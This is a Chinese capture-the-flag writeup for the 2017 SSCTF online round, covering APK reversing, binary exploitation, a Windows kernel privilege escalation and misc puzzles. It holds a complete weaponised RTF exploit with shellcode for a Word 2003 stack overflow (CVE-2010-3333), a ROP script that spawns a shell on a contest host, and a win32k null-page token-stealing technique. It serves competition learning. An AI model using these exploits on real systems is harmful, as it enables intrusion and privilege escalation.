> 原文链接: https://www.anquanke.com//post/id/86039 


# 【CTF 攻略】第三届 SSCTF 全国网络安全大赛—线上赛 Writeup


                                阅读量   
                                **370341**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



****[![](https://p4.ssl.qhimg.com/t016c5c9f0cfbb65daf.png)](https://p4.ssl.qhimg.com/t016c5c9f0cfbb65daf.png)

作者：[**FlappyPig**](http://bobao.360.cn/member/contribute?uid=1184812799)

预估稿费：600RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**传送门**

[**第三届 SSCTF 全国网络安全大赛—线上赛圆满结束！**](http://bobao.360.cn/ctf/activity/421.html)



2017年5月6日-7日，在陕西省互联网信息办公室、陕西省通信管理局指导下，由陕西省网络安全信息协会、西安四叶草信息技术有限公司与北京兰云科技有限公司联合主办，17家大型互联网行业的SRC和14家专业媒体以及新华网、新浪网、搜狐网、凤凰网、陕西网等20多家媒体的大力支持下，第三届SSCTF全国网络安全大赛—线上初赛圆满结束。



**逆向分析**

**apk100 加密勒索软件**

题目是一个简单的加密软件，一打开软件首先提示输入pin码，点确定后提示输入解密pin码。

进入查看代码，发现第一步会首先计算APK的签名，并将签名与一个MD5做一些乱七八糟的运算得到一个字符数组k1，这里我们不管他，直接使用jeb2动态调试拿到计算完成后的k1结果。

随后会结合我们输入的pin码与k1做一个两层循环的异或运算得到一个新的k1变量。

最后利用这个新的变量对xlsx文件进行一个加密，加密的原理是xlsx文件的每256个字节与k1的相应量做异或。

第二部的解密代码看了看啥也没有，就是验证了一下签名。

思考了一下由于pin码是六位整数，因此可以直接爆破。爆破过程中可以利用zipfile模块的is_zipfile函数来判断是不是zip文件，利用openpyxl模块来判断是不是合法的xlsx文件，同时为了加快速度，优先判断解密后的字符串开头是否为“PK”。

代码：



```
from zipfile import is_zipfile
from openpyxl import load_workbook
import StringIO
def getk(key):
    k = [50, 105, 20, 75, 40, 45, 1, 15, 98, 17, 68, 35, 38, 30, 8, 0, 76, 65, 46, 35, 23, 5, 120, 55, 90, 41, 60, 20,
         30, 117, 50, 87, 20, 57, 108, 27, 78, 61, 80, 8]
    for i in range(100):
        for j in range(100):
            k[(i + 17) * (j + 5) % len(k)] = (k[i * j % len(k)] ^ ord(key[i * j % len(key)]) * 7) % 127
    return k
enc_str = open('ctf1_encode.xlsx', 'rb').read()
enc_list = [ord(i) for i in enc_str]
def run():
    magic = enc_list[0] ^ ord('P')
    for key in xrange(100000, 1000000):
        k = getk(str(key))
        if k[0] == magic:
            l = list(enc_list)
            for j in range(0, len(l), 256):
                l[j] ^= k[j % len(k)]
            s = StringIO.StringIO(''.join([chr(i) for i in l]))
            if is_zipfile(s):
                print key
                try:
                    load_workbook(s)
                    print 'got it', key
                    open('tmp.xlsx', 'wb').write(''.join([chr(i) for i in l]))
                    return
                except:
                    continue
run()
#         key = 112355
```

最后得出来可以是112355，打开xlsx文件是一个图片标注着flag

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t015048525b187eed30.png)

**apk200 Login**

本题运行apk界面为一个输入框和确定按钮，用jeb反编译，查看关键代码逻辑

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01446b3113a485660b.png)

可以看出输入字符串长度为12，输入的字符串传入native函数中处理，然后传到a.a方法中，跟进看一下a.a方法，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ffd2b36d6e06cd3a.png)

可以看出该方法主要将处理过的输入字符串和一个字符串常量“01635e6c5f2378255f27356c11663165”进行aes加密后，进行一些异或运算，最后似的变量v0的md5为“cfcd208495d565ef66e7dff9f98764da”，md5查了一下是0，也就是说v0最后的值是0，分析一下代码可以发现，v0只有相加的操作，同时相加的值是两个aes加密结果的异或，因此不难推断出两个aes加密的结果是相同的。

也就是说native层处理完后的输入正好是“01635e6c5f2378255f27356c11663165”，因此加密的主要关注点在native层函数。

Native层函数逻辑比较简单，主要是把输入的每个字符按不同的位进行拆分，拆分后的结果作为一个数组的索引，再把数组的值拼接起来。具体的看代码吧，加解密都实现了。



```
L = "!:#$%&amp;()+-*/`~_[]`{``}`?&lt;&gt;,.@^abcdefghijklmnopqrstuvwxyz012345678"
L = [ord(i) for i in L]
def enc(s):
    assert len(s) == 12
    l = [ord(i) for i in s]
    r = []
    for i in range(0, len(l), 3):
        r.append(L[
                     l[i] &gt;&gt; 2
                     ]
                 ^ 0x3f)
        r.append(L[
                     (
                         l[i + 1] &gt;&gt; 4
                     )
                     +
                     (
                         (l[i] &lt;&lt; 4)
                         &amp; 0x3f
                     )
                     ] ^ 0xf)
        r.append(L[
                     (
                         (l[i + 1] &lt;&lt; 2)
                         &amp; 0x3f
                     )
                     + (
                         l[i + 2] &gt;&gt; 6
                     )
                     ])
        r.append(L[
                     l[i + 2] &amp; 0x3f
                     ])
    print r
    return ''.join([chr(i) for i in r])
s = enc('0123456789ab')
# print s
print len(s)
print s.encode('hex')
def dec(s):
    def index(j):
        return L.index(j)
    l = [ord(i) for i in s]
    r = []
    for i in range(0, len(l), 4):
        r.append(
            (
                (index(l[i] ^ 0x3f) &lt;&lt; 2) &amp; 0xff
            ) +
            (
                index(l[i + 1] ^ 0xf) &gt;&gt; 4
            )
        )
        r.append(
            (
                (index(l[i + 1] ^ 0xf) &lt;&lt; 4) &amp; 0xff
            ) +
            (
                index(l[i + 2]) &gt;&gt; 2
            )
        )
        r.append(
            (
                (index(l[i + 2]) &lt;&lt; 6) &amp; 0xff
            ) +
            index(l[i + 3])
        )
    print r
    return ''.join([chr(i) for i in r])
print dec(s)
print dec('01635e6c5f2378255f27356c11663165'.decode('hex'))
```

最后接触的密钥为VVe1lD0ne^-^

输入并点击确定后拿到flag：SSCTF`{`C0ngraTu1ationS!`}`

<br>

**漏洞挖掘**

**Pwn150 Word2003**

分析：

漏洞cve20103333，详细的漏洞分析网上已经有了，是个栈溢出漏洞，网址如下：

[http://www.52pojie.cn/thread-290299-1-1.html](http://www.52pojie.cn/thread-290299-1-1.html) 

代码如下：

```
`{`rtf1`{``}``{`shp`{`*shpinst`{`sp`{`sv1;1;41414141414142424242414141414141414141414141414141411245fa7f00000000000000000000000000000000000000009090909090909090`}``{`sn pfragments`}``}``}``}``}`
```

只要在90909090后面跟shellcode即可，于是编写windows下面的shellcode，步骤如下：

1. 获取kernel32基址

2. 获取loadlibrary和Getprocaddress地址，参考：http://www.2cto.com/kf/201012/80340.html

3. 获取文件读写函数地址，fopen，fread，fclose

4．获取malloc地址和messagebox地址

5．读取文件，调用messagebox显示。

其中c盘创建文件内容为随机字符:12k3nihdpi-1234。

C代码如下：编译时去掉栈保护，即可使用自输出函数数据：



```
/*
void *get_kernel32_base()
`{`
__asm
`{`
push ebp
xor ecx,ecx
mov esi,fs:0x30
mov esi, [esi + 0x0C];
mov esi, [esi + 0x1C];
next_module:
mov ebp, [esi + 0x08];
mov edi, [esi + 0x20];
mov esi, [esi];
cmp [edi + 12*2],cl
jne next_module
mov edi,ebp;BaseAddr of Kernel32.dll
mov eax, edi
pop ebp
`}`
`}`
*/
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
void ShellcodeEntry();
#define KERNEL32_HASH 0x000d4e88
#define KERNEL32_LOADLIBRARYA_HASH 0x000d5786
#define KERNEL32_GETPROCADDRESSA_HASH 0x00348bfa
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCTSTR lpFileName);
typedef FARPROC (WINAPI *pGetProcAddressA)(HMODULE hModule, LPCTSTR lpProcName);
void  ShellCodeStart(void)
`{`
ShellcodeEntry();
`}`
void ResolvAddr(pLoadLibraryA *pfLoadLibraryA,pGetProcAddressA *pfGetProcAddressA)
`{`
pLoadLibraryA fLoadLibraryA;
pGetProcAddressA fGetProcAddressA;
//获?取¨?API函¡¥数ºy地Ì?址¡¤代ä¨²码?出?自Á?The Shellcoders Handbook一°?书º¨¦
//支¡ì持?win 2k/NT/xp/7其?它¨¹没?测a试º?
__asm
`{`
push KERNEL32_LOADLIBRARYA_HASH
push KERNEL32_HASH
call ResolvFuncAddr
mov fLoadLibraryA, eax
push KERNEL32_GETPROCADDRESSA_HASH
push KERNEL32_HASH
call ResolvFuncAddr
mov fGetProcAddressA, eax
jmp totheend
ResolvFuncAddr:
push ebp
mov ebp, esp
push ebx
push esi
push edi
push ecx
push fs:[0x30]
pop eax
mov eax, [eax+0x0c]
mov ecx, [eax+0x0c]
next_module:
mov edx, [ecx]
mov eax, [ecx+0x30]
push 0x02
mov edi, [ebp+0x08]
push edi
push eax
call hashit
test eax, eax
jz foundmodule
mov ecx, edx
jmp next_module
foundmodule:
mov eax, [ecx+0x18]
push eax
mov ebx, [eax+0x3c]
add eax, ebx
mov ebx, [eax+0x78]
pop eax
push eax
add ebx, eax
mov ecx, [ebx+28]
mov edx, [ebx+32]
mov ebx, [ebx+36]
add ecx, eax
add edx, eax
add ebx, eax
find_procedure:
mov esi, [edx]
pop eax
push eax
add esi, eax
push 1
push [ebp+12]
push esi
call hashit
test eax, eax
jz found_procedure
add edx, 4
add ebx, 2
jmp find_procedure
found_procedure:
pop eax
xor edx, edx
mov dx, [ebx]
shl edx, 2
add ecx, edx
add eax, [ecx]
pop ecx
pop edi
pop esi
pop ebx
mov esp, ebp
pop ebp
ret 0x08
hashit:
push ebp
mov ebp, esp
push ecx
push ebx
push edx
xor ecx,ecx
xor ebx,ebx
xor edx,edx
mov eax, [ebp+0x08]
hashloop:
mov dl, [eax]
or dl, 0x60
add ebx, edx
shl ebx, 0x01
add eax, [ebp+16]
mov cl, [eax]
test cl, cl
loopnz hashloop
xor eax, eax
mov ecx, [ebp+12]
cmp ebx, ecx
jz donehash
inc eax
donehash:
pop edx
pop ebx
pop ecx
mov esp, ebp
pop ebp
ret 12
totheend:
`}`
*pfLoadLibraryA = fLoadLibraryA;
*pfGetProcAddressA = fGetProcAddressA;
`}`
typedef int (WINAPI *pMessageBoxA)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
typedef FILE* (__cdecl *pfopen)(const char * path,const char * mode);
typedef size_t (__cdecl * pfread)( void *buffer, size_t size, size_t count, FILE *stream);
typedef int (__cdecl * pfseek)(FILE *stream, long offset, int fromwhere);
typedef long int (__cdecl *pftell)( FILE * stream );
typedef int (__cdecl * pfclose)(FILE *stream);
typedef void* (__cdecl * pmalloc)(size_t size);
void fmemset(void *dest, char ch, int size)
`{`
int i;
for (i = 0; i &lt; size; i++)
`{`
((char *)dest)[i] = ch;
`}`
`}`
void ShellcodeEntry()
`{`
pLoadLibraryA fLoadLibraryA;
pGetProcAddressA fGetProcAddressA;
ResolvAddr(&amp;(fLoadLibraryA), &amp;(fGetProcAddressA));
int val_User32_dll[3];
val_User32_dll[0] = 0x72657355;
val_User32_dll[1] = 0x642e3233;
val_User32_dll[2] = 0x6c6c;
int val_MessageBoxA[3];
val_MessageBoxA[0] = 0x7373654d;
val_MessageBoxA[1] = 0x42656761;
val_MessageBoxA[2] = 0x41786f;
int val_msvcrt_dll[3];
val_msvcrt_dll[0] = 0x6376736d;
val_msvcrt_dll[1] = 0x642e7472;
val_msvcrt_dll[2] = 0x6c6c;
int val_fopen[2];
val_fopen[0] = 0x65706f66;
val_fopen[1] = 0x6e;
int val_fread[2];
val_fread[0] = 0x61657266;
val_fread[1] = 0x64;
int val_fseek[2];
val_fseek[0] = 0x65657366;
val_fseek[1] = 0x6b;
int val_ftell[2];
val_ftell[0] = 0x6c657466;
val_ftell[1] = 0x6c;
int val_fclose[2];
val_fclose[0] = 0x6f6c6366;
val_fclose[1] = 0x6573;
int val_malloc[2];
val_malloc[0] = 0x6c6c616d;
val_malloc[1] = 0x636f;
int val_SSCTF2017[3];
val_SSCTF2017[0] = 0x54435353;
val_SSCTF2017[1] = 0x31303246;
val_SSCTF2017[2] = 0x37;
int val_c_flag_txt[3];
val_c_flag_txt[0] = 0x665c3a63;
val_c_flag_txt[1] = 0x2e67616c;
val_c_flag_txt[2] = 0x747874;
int val_rb[1];
val_rb[0] = 0x6272;
HMODULE User32;
pMessageBoxA fMessageBoxA;
User32 = fLoadLibraryA((char *)val_User32_dll);
fMessageBoxA = (pMessageBoxA)fGetProcAddressA(User32, (char *)val_MessageBoxA);
HMODULE Msvcrt;
long int fz;
pfopen ffopen;
pfread ffread;
pfseek ffseek;
pftell fftell;
pfclose ffclose;
pmalloc fmalloc;
Msvcrt = fLoadLibraryA((char *)val_msvcrt_dll);
ffopen = (pfopen)fGetProcAddressA(Msvcrt,(char *)val_fopen);
ffread = (pfread)fGetProcAddressA(Msvcrt, (char *)val_fread);
ffseek = (pfseek)fGetProcAddressA(Msvcrt,(char *)val_fseek);
fftell = (pftell)fGetProcAddressA(Msvcrt, (char *)val_ftell);
ffclose = (pfclose)fGetProcAddressA(Msvcrt, (char *)val_fclose);
fmalloc = (pmalloc)fGetProcAddressA(Msvcrt, (char *)val_malloc);
char* Title = (char *)val_SSCTF2017;
char* filename = (char *)val_c_flag_txt;
char *mode = (char *)val_rb;
char *buff;
FILE *fp = ffopen(filename, mode);
ffseek(fp, 0, SEEK_END);
fz = fftell(fp);
ffseek(fp, 0, SEEK_SET);
buff = (char *)fmalloc(fz + 1);
ffread(buff, 1, fz, fp);
ffclose(fp);
int i; 
for (i = 0; i &lt; fz; i++)
`{`
buff[i] ^= 0xcc;
`}`
buff[fz] = 0;
fMessageBoxA(NULL,buff,Title,MB_OK);
//getchar();
`}`
void  ShellCodeEnd(void)
`{`
__asm
`{`
nop
nop
nop
`}`
`}`
void main()
`{`
unsigned char *p_ptr = (unsigned char *)ShellCodeStart;
unsigned char *p_end = (unsigned char *)ShellCodeEnd;
printf("size:%dn", p_end - p_ptr);
while (p_ptr &lt; p_end)
`{`
printf("%02x", *p_ptr);
p_ptr++;
`}`
ShellCodeStart();
`}`
Exp：test.doc如下：
`{`rtf1`{``}``{`shp`{`*shpinst`{`sp`{`sv1;1;41414141414142424242414141414141414141414141414141411245fa7f00000000000000000000000000000000000000009090909090909090e90b010000cccccccccccccccccccccc558bec83ec085356576886570d0068884e0d00e81a0000008945fc68fa8b340068884e0d00e8080000008945f8e9b5000000558bec5356575164ff3530000000588b400c8b480c8b118b41306a028b7d085750e85b00000085c074048bcaebe78b4118508b583c03c38b5878585003d88b4b1c8b53208b5b2403c803d003d88b32585003f06a01ff750c56e82300000085c0740883c20483c302ebe35833d2668b13c1e20203ca0301595f5e5b8be55dc20800558bec51535233c933db33d28b45088a1080ca6003dad1e30345108a0884c9e0ee33c08b4d0c3bd97401405a5b598be55dc20c008b45088b4dfc89088b550c8b45f889025f5e5b8be55dc3cccc558bec81ec8c0000005356578d45fc508d4df851e8e7feffff83c408b86c6c00008d55a452c745a455736572c745a833322e648945acc745804d657373c7458461676542c745886f784100c745986d737663c7459c72742e648945a0c745b0666f7065c745b46e000000c745d866726561c745dc64000000c745b866736565c745bc6b000000c745c86674656cc745cc6c000000c745c066636c6fc745c473650000c745d06d616c6cc745d46f630000c78574ffffff53534354c78578ffffff46323031c7857cffffff37000000c7458c633a5c66c745906c61672ec7459474787400c745ec72620000ff55f88d4d805150ff55fc8d5598528945e0ff55f88bf08d45b05056ff55fc8d4dd851568bf8ff55fc8d55b852568945f0ff55fc8bd88d45c85056ff55fc8d4dc051568945f4ff55fc8d55d052568945e8ff55fc8945e48d45ec508d4d8c51ffd76a028bf06a0056ffd356ff55f46a006a00568bf8ffd38d570152ff55e456578bd86a0153ff55f056ff55e883c43c33c085ff7e0a90803418cc403bc77cf76a008d8574ffffff50536a00c6043b00ff55e05f5e5b8be55dc3cccccccccccccccccccccccccc`}``{`sn pfragments`}``}``}``}``}`
```

成功截图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0112a5f5fae0d82bb7.png)

**Pwn250 pwn2**

**分析：**

漏洞很简单，栈溢出，如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f5c4dd8afeac42e0.png)

**利用：**

直接rop即可，利用代码如下：



```
from zio import *
is_local = True
is_local = False
binary_path = "./250"
libc_file_path = ""
#libc_file_path = "./libc.so.6"
ip = "60.191.205.81"
port = 2017
if is_local:
target = binary_path
else:
target = (ip, port)
def get_io(target):
r_m = COLORED(RAW, "green")
w_m = COLORED(RAW, "blue")
#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m, env=`{`"LD_PRELOAD":libc_file_path`}`)
return io
def gen_rop_data(func_addr, args, pie_text_base = 0):
    p_ret = [0x080481b2, 0x08048480, 0x0804847f, 0x0804847e, 0x080483c7, 0x08098774]
    rop_data  = ''
    rop_data += l32(func_addr)
    if len(args) &gt; 0:
        rop_data += l32(p_ret[len(args)] + pie_text_base)
    for arg in args:
        rop_data += l32(arg)
    return rop_data
from pwn import*
import time
def pwn(io):
#offset info
if is_local:
#local
offset_system = 0x0
offset_binsh = 0x0
else:
#remote
offset_system = 0x0
offset_binsh = 0x0
io.read_until("]")
dl_mk_stack_exe = 0x080A0AF0
context(arch = 'i386', os = 'linux')
shellcode = asm(shellcraft.i386.sh())
#0x080e77dc : add ebx, esp ; add dword ptr [edx], ecx ; ret
add_ebx_esp = 0x080e77dc
#0x080481c9 : pop ebx ; ret
p_ebx_ret = 0x080481c9
#0x0804f2ea : mov eax, ebx ; pop ebx ; ret
mov_eax_ebx_p_ret = 0x0804f2ea
#0x0806cbb5 : int 0x80
p_eax_ret = 0x080b89e6
p_ebx_ret = 0x080481c9
p_ecx_ret = 0x080df1b9
p_edx_ret = 0x0806efbb
int80_addr = 0x0806cbb5
read_addr = 0x0806D510
bss_addr = 0x080ece00
payload = ""
payload += "a"*0x3a
payload += l32(0)
payload += gen_rop_data(read_addr, [0, bss_addr, 8])
payload += l32(p_eax_ret)
payload += l32(0xb)
payload += l32(p_ebx_ret)
payload += l32(bss_addr)
payload += l32(p_ecx_ret)
payload += l32(0)
payload += l32(p_edx_ret)
payload += l32(0)
payload += l32(int80_addr)
io.writeline(str(1000))
io.read_until("]")
io.gdb_hint()
io.writeline(payload)
io.read_until("]")
time.sleep(1)
io.writeline("/bin/shx00")
io.interact()
io.interact()
io = get_io(target)
pwn(io)
```

**flag如下：**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014816d9909ae12d79.png)

**Pwn450 本地提权**

这是一个由于PDEV未初始化引用导致的漏洞，首先修改poc，并且运行，用windbg的pipe功能远程调试win7 ，会捕获到漏洞触发位置。



```
kd&gt; r
eax=00000000 ebx=980b0af8 ecx=00000001 edx=00000000 esi=00000000 edi=fe9950d8
eip=838b0560 esp=980b0928 ebp=980b09a0 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
win32k!bGetRealizedBrush+0x38:
838b0560 f6402401        test    byte ptr [eax+24h],1       ds:0023:00000024=??
```

这个位置eax引用了0x0，需要跟踪这个eax由什么地方得到，首先分析win32k!bGetRealizedBrush函数。



```
int __stdcall bGetRealizedBrush(struct BRUSH *a1, struct EBRUSHOBJ *a2, int (__stdcall *a3)(struct _BRUSHOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _SURFOBJ *, struct _XLATEOBJ *, unsigned __int32))
`{`
```

函数定义了3个变量，其中a3是EngRealizeBrush函数，a1是一个BRUSH结构体，a2是一个EBRUSHOBJ结构体，而漏洞触发位置的eax就由EBRUSHOBJ结构体得来，跟踪分析一下这个过程。



```
kd&gt; p
win32k!bGetRealizedBrush+0x1c://ebx由第二个参数得来
969e0544 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]
……
kd&gt; p
win32k!bGetRealizedBrush+0x25://第二个参数+34h的位置的值交给eax
969e054d 8b4334          mov     eax,dword ptr [ebx+34h]
……
kd&gt; p
win32k!bGetRealizedBrush+0x32://eax+1c的值，交给eax，这个值为0
969e055a 8b401c          mov     eax,dword ptr [eax+1Ch]
kd&gt; p
win32k!bGetRealizedBrush+0x35:
969e055d 89450c          mov     dword ptr [ebp+0Ch],eax
kd&gt; p
win32k!bGetRealizedBrush+0x38://eax为0，引发无效内存访问
969e0560 f6402401        test    byte ptr [eax+24h],1
```

经过上面的分析，我们需要知道，EBRUSHOBJ+34h位置存放着什么样的值，直接来看EBRUSHOBJ结构体的内容。



```
kd&gt; dd 8effcaf8
8effcaf8  ffffffff 00000000 00000000 00edfc13
8effcb08  00edfc13 00000000 00000006 00000004
8effcb18  00000000 00ffffff fe96b7c4 00000000
8effcb28  00000000 fd2842e8 ffbff968 ffbffe68
```

这里+34h位置存放的值是fd2842e8，而fd2842e8+1c存放的是



```
kd&gt; dd fd2842e8
fd2842e8  108501ef 00000001 80000000 874635f8
fd2842f8  00000000 108501ef 00000000 00000000
fd284308  00000008 00000008 00000020 fd28443c
fd284318  fd28443c 00000004 00001292 00000001
```

这里对象不明朗没关系，来看一下+1c位置存放的是什么样的结构，通过kb堆栈回溯（这里由于多次重启堆栈地址发生变化，不影响调试）



```
kd&gt; kb
 # ChildEBP RetAddr  Args to Child              
00 980b09a0 838b34af 00000000 00000000 838ad5a0 win32k!bGetRealizedBrush+0x38
01 980b09b8 83929b5e 980b0af8 00000001 980b0a7c win32k!pvGetEngRbrush+0x1f
02 980b0a1c 839ab6e8 fe975218 00000000 00000000 win32k!EngBitBlt+0x337
03 980b0a54 839abb9d fe975218 980b0a7c 980b0af8 win32k!EngPaint+0x51
04 980b0c20 83e941ea 00000000 ffbff968 1910076b win32k!NtGdiFillRgn+0x339
```

跟踪外层函数调用，在NtGdiFillRgn函数中



```
EngPaint(
              (struct _SURFOBJ *)(v5 + 16),
              (int)&amp;v13,
              (struct _BRUSHOBJ *)&amp;v18,
              (struct _POINTL *)(v42 + 1592),
              v10);                             // 进这里
```

传入的第一个参数是SURFOBJ对象，来看一下这个对象的内容



```
kd&gt; p
win32k!NtGdiFillRgn+0x334:
96adbb98 e8fafaffff      call    win32k!EngPaint (96adb697)
kd&gt; dd esp
903fca5c  ffb58778 903fca7c 903fcaf8 ffaabd60
```

第一个参数SURFOBJ的值是ffb58778，继续往后跟踪



```
kd&gt; p
win32k!EngPaint+0x45:
96adb6dc ff7508          push    dword ptr [ebp+8]
kd&gt; p
win32k!EngPaint+0x48:
96adb6df 8bc8            mov     ecx,eax
kd&gt; p
win32k!EngPaint+0x4a:
96adb6e1 e868e4f8ff      call    win32k!SURFACE::pfnBitBlt (96a69b4e)
kd&gt; dd 903fcaf8
903fcaf8  ffffffff 00000000 00000000 00edfc13
903fcb08  00edfc13 00000000 00000006 00000004
903fcb18  00000000 00ffffff ffaab7c4 00000000
903fcb28  00000000 ffb58768 ffbff968 ffbffe68
903fcb38  ffbbd540 00000006 fe57bc38 00000014
903fcb48  000000d3 00000001 ffffffff 83f77f01
903fcb58  83ec0892 903fcb7c 903fcbb0 00000000
903fcb68  903fcc10 83e17924 00000000 00000000
kd&gt; dd ffb58768
ffb58768  068501b7 00000001 80000000 8754b030
ffb58778  00000000 068501b7 00000000 00000000
ffb58788  00000008 00000008 00000020 ffb588bc
```

发现在EBRUSHOBJ+34h位置存放的值，再+10h存放的正是之前的SURFOBJ，也就是说，之前ffb58768+1ch位置存放的就是SURFOBJ+0xc的值，而这个值来看一下SURFOBJ的结构



```
typedef struct _SURFOBJ `{`
  DHSURF dhsurf;
  HSURF  hsurf;
  DHPDEV dhpdev;
  HDEV   hdev;
  SIZEL  sizlBitmap;
  ULONG  cjBits;
  PVOID  pvBits;
  PVOID  pvScan0;
  LONG   lDelta;
  ULONG  iUniq;
  ULONG  iBitmapFormat;
  USHORT iType;
  USHORT fjBitmap;
`}` SURFOBJ;
```

这个位置存放的是hdev对象，正是因为未对这个对象进行初始化直接引用，导致了漏洞的发生。

漏洞利用时，在win32k!bGetRealizedBrush找到一处调用



```
.text:BF840810 loc_BF840810:                           ; CODE XREF: bGetRealizedBrush(BRUSH *,EBRUSHOBJ *,int (*)(_BRUSHOBJ *,_SURFOBJ *,_SURFOBJ *,_SURFOBJ *,_XLATEOBJ *,ulong))+2E0j
.text:BF840810                 mov     ecx, [ebp+P]
.text:BF840813                 mov     ecx, [ecx+2Ch]
.text:BF840816                 mov     edx, [ebx+0Ch]
.text:BF840819                 push    ecx
.text:BF84081A                 push    edx
.text:BF84081B                 push    [ebp+var_14]
.text:BF84081E                 push    eax
.text:BF84081F                 call    edi             ;
```

利用call edi可以跳转到我们要的位置，edi来自于a2，也就是未初始化对象赋值，因此我们可以控制这个值，接下来看看利用过程。

利用这个未初始化的对象，可以直接利用零页内存绕过限制，有几处跳转，第一处



```
v20 = a2;//v20赋值
      if ( *((_DWORD *)a2 + 284) &amp; 0x200000 &amp;&amp; (char *)a3 != (char *)EngRealizeBrush )
      `{`
        v21 = *((_DWORD *)v5 + 13);
        if ( v21 )
          v22 = (struct _SURFOBJ *)(v21 + 16);
        else
          v22 = 0;
        if ( a3(v5, v22, 0, 0, 0, *((_DWORD *)v5 + 3) | 0x80000000) )// come to this?
        `{`
          v19 = 1;
          goto LABEL_24;
        `}`
        v20 = a2;//v20赋值
      `}`
      v23 = *((_WORD *)v20 + 712);
      if ( !v23 )//这里有一个if语句跳转
        goto LABEL_23;
```

这时候v20的值是a2，而a2的值来自于  a2 = *(struct EBRUSHOBJ **)(v6 + 28);，之前已经分析过，由于未初始化，这个值为0

那么第一处在v23的if语句跳转中，需要置0+0x590位置的值为不为0的数。

第二处在



```
v24 = (struct EBRUSHOBJ *)((char *)v20 + 1426);
      if ( !*(_WORD *)v24 )
        goto LABEL_23;
```

这个地方又要一个if语句跳转，这个地方需要置0x592位置的值为不为0的数。

最后一处，也就是call edi之前的位置



```
.text:BF8407F0                 mov     edi, [eax+748h]//edi赋值为跳板值
.text:BF8407F6                 setz    cl
.text:BF8407F9                 inc     ecx
.text:BF8407FA                 mov     [ebp+var_14], ecx
.text:BF8407FD ; 134:       if ( v26 )
.text:BF8407FD                 cmp     edi, esi//这里仍旧是和0比较
.text:BF8407FF                 jz      short loc_BF840823
```

这个地方需要edi和esi做比较，edi不为0，这里赋值为替换token的shellcode的值就是不为0的值了，直接可以跳转。

因此，需要在源码中构造这三个位置的值。



```
void* bypass_one = (void *)0x590;
*(LPBYTE)bypass_one = 0x1;
void* bypass_two = (void *)0x592;
*(LPBYTE)bypass_two = 0x1;
void* jump_addr = (void *)0x748;
*(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;
```

最后替换system token即可完成利用

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0153f798664cbfd572.png)

<br>

**杂项**

**Misc50 签到**

**题面：** Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ==



```
&gt;&gt;&gt; import base64
&gt;&gt;&gt; str = 'Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ=='
&gt;&gt;&gt; base64.b64decode(str)
'ggQ@gQ1fqh0ohtjpt_sw`{`gfhgs#`}`
```

解base64得

```
ggQ@gQ1fqh0ohtjpt_sw`{`gfhgs#`}`
```

解栅栏得

```
ggqht`{`ggQht_gsQ10jsf#@fopwh`}`
```

解凯撒加密得

```
ssctf`{`ssCtf_seC10ver#@rabit`}`
```

**Misc100 flag在哪里**

分析下流量包： [Expert Info (Chat/Sequence): GET /.nijiakadaye/info/refs?service=git-upload-pack HTTP/1.1rn]

发现这是一些git文件

